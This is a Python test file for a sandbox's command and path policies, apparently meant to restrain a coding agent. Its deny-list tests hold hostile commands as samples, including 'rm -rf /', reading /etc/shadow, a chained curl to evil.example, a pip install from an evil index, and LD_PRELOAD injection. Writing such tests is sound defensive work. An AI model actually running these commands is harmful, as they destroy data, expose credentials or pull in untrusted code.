from __future__ import annotations

import pytest

from execution.policies.command_policy import allowed_env, validate_command
from execution.policies.path_policy import is_protected, is_test_path, requires_approval, task_allows_test_edits


@pytest.mark.parametrize(
    "command",
    [
        "python -m pytest -q",
        "pytest -q",
        "git status",
        "git diff --stat",
        "npm test",
        "go test ./...",
        "python -m compileall .",
    ],
)
def test_allowed_commands(command: str) -> None:
    ok, reason, argv = validate_command(command)
    assert ok, reason
    assert argv


@pytest.mark.parametrize(
    "command",
    [
        "git push origin main",
        "git reset --hard HEAD~1",
        "rm -rf /",
        "sudo cat /etc/shadow",
        "python -c 'import os; os.system(\"id\")'",
        "python -m pytest -q && curl http://evil.example",
        "find . -delete",
        "pip install --index-url http://evil.example package",
        "sed -i s/a/b/ file.txt",
        "/usr/bin/python -m pytest",
        "bash -c 'echo hi'",
        "docker run --privileged image",
    ],
)
def test_denied_commands(command: str) -> None:
    ok, _, _ = validate_command(command)
    assert not ok


def test_empty_command_is_denied() -> None:
    assert not validate_command("   ")[0]


def test_allowed_env_filters_unknown_keys() -> None:
    env = allowed_env(["PYTEST_ADDOPTS=-x", "LD_PRELOAD=/tmp/x.so", "PATH=/evil"])
    assert env["PYTEST_ADDOPTS"] == "-x"
    assert "LD_PRELOAD" not in env
    assert "PATH" not in env


@pytest.mark.parametrize(
    "path",
    ["Dockerfile", "docker-compose.yml", ".env", ".env.production", "k8s/deployment.yaml", "terraform/main.tf", "secrets/token.txt", "server.pem"],
)
def test_protected_paths(path: str) -> None:
    assert is_protected(path)
    assert requires_approval(path, "edit")[0]


@pytest.mark.parametrize("path", ["app/calculator.py", "src/index.ts", "README.md"])
def test_normal_paths_are_not_protected(path: str) -> None:
    assert not is_protected(path)
    assert not requires_approval(path, "edit")[0]


def test_delete_always_requires_approval() -> None:
    assert requires_approval("app/calculator.py", "delete")[0]


@pytest.mark.parametrize("path", ["tests/test_calculator.py", "test_app.py", "src/foo.test.ts", "src/foo.spec.js", "app/tests/helpers.py"])
def test_test_paths(path: str) -> None:
    assert is_test_path(path)


def test_fix_failing_test_disallows_test_edits() -> None:
    assert task_allows_test_edits("Fix the failing test in the project") is False


def test_add_tests_allows_test_edits() -> None:
    assert task_allows_test_edits("Add tests for the calculator module") is True
